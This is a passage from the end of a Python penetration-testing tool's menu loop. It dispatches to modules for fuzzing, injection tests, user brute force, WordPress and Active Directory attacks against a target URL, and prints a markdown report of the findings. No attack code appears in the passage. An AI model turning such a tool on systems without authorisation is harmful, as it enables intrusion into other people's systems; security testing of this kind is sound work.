                run_vhost_fuzzing(TARGET_URL, session)
            elif option == '6':
                run_directory_fuzzing(TARGET_URL, session)
            elif option == '7':
                run_spider(TARGET_URL, session)
            elif option == '8':
                run_source_code_analysis(TARGET_URL, session)
            elif option == '9':
                run_injection_tests(TARGET_URL, session)
            elif option == '10':
                run_api_tests(TARGET_URL, session)
            elif option == '11':
                run_user_enum_bruteforce(TARGET_URL, session)
            elif option == '12':
                run_wordpress_attacks(TARGET_URL, session)
            elif option == '13':
                run_active_directory_pentest(TARGET_URL)
            elif option == '14':
                run_full_pentest(TARGET_URL, session)
            elif option == '15':
                if not _has_scan_data():
                    print_warning("No data yet. Run a module or full pentest first.")
                else:
                    report_data = {
                        "tool": VERSION,
                        "target": TARGET_URL,
                        "date": time.strftime('%Y-%m-%d %H:%M:%S'),
                        "findings": list(FINDINGS),
                        "scan_data": _to_serializable(SCAN_DATA),
                    }
                    md = _build_markdown_report(report_data)
                    print()
                    print("=" * 70)
                    print(" MARKDOWN SUMMARY (copy from the next line):")
                    print("=" * 70)
                    print(md)
                    print("=" * 70)
                    print_good("End of markdown. Copy the block above.")
            elif option == '16':
                if not _has_scan_data():
                    print_warning("No data yet. Run a module or full pentest first.")
                else:
                    print_final_summary(TARGET_URL)
            elif option == '17':
                _exit_gracefully()
            else:
                print_error("Invalid option. Try again.")
        except KeyboardInterrupt:
            try:
                print()
                confirm = input("\nExit program? [Y/n]: ").strip().lower()
            except (KeyboardInterrupt, EOFError):
                confirm = 's'
            if confirm != 'n':
                _exit_gracefully()
            continue
        except Exception as e:
            print_error(f"Unexpected error: {e}")

        try:
            input("\nPress Enter to continue...")
        except (KeyboardInterrupt, EOFError):
            _exit_gracefully()

    _exit_gracefully()

if __name__ == "__main__":
    main()
